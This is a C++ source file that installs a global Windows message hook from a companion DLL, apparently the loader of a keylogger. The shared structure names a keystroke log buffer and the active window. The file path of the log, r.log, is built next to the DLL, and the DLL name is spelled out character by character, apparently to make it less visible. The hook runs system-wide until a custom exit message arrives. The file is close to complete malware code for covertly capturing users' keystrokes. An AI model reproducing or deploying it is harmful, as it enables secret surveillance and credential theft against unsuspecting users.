// install_x64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <Windows.h>

#define EXIT_HOOK 0x10086
#define KEY_BUF_SIZE	16

typedef	struct
{
	HWND	hActWnd;						//current actived window
	char	strRecordFile[MAX_PATH];
	char	keybuffer[KEY_BUF_SIZE];		//log buffer
	DWORD	usedlen;						//
	DWORD	LastMsgTime;
}TShared;

extern "C" __declspec(dllimport) TShared SharedData;
extern "C" __declspec(dllimport) LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam);

#ifdef _WIN64
#pragma comment(lib,"..\\x64\\release\\hookdll_x64.lib")
#else
#pragma comment(lib,"..\\release\\hookdll_x86.lib")
#endif

void MyEntry() {
	MSG msg = { 0 };
#ifdef _WIN64
	WCHAR szModule[] = { 'h','o','o','k','d','l','l','_','x','6','4','.','d','l','l',0 };
#else
	WCHAR szModule[] = { 'h','o','o','k','d','l','l','_','x','8','6','.','d','l','l',0};
#endif
	char* p = 0;
	HINSTANCE hInstance = GetModuleHandle(szModule);
	HHOOK hHook = NULL;
	
	GetModuleFileNameA(hInstance, SharedData.strRecordFile, sizeof(SharedData.strRecordFile));
	p = SharedData.strRecordFile + lstrlenA(SharedData.strRecordFile) - 1;
	while (p >= SharedData.strRecordFile && *p != '\\') --p;
	++p;
	*p = NULL;	
	p[0] = '\\';
	p[1] = 'r';
	p[2] = '.';
	p[3] = 'l';
	p[4] = 'o';
	p[5] = 'g';
	p[6] = 0;

	hHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInstance, 0);

	while(GetMessage(&msg, 0, 0, 0)){
		if (msg.message == EXIT_HOOK) {
			break;
		}
		else {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	UnhookWindowsHookEx(hHook);
	ExitProcess(0);
}
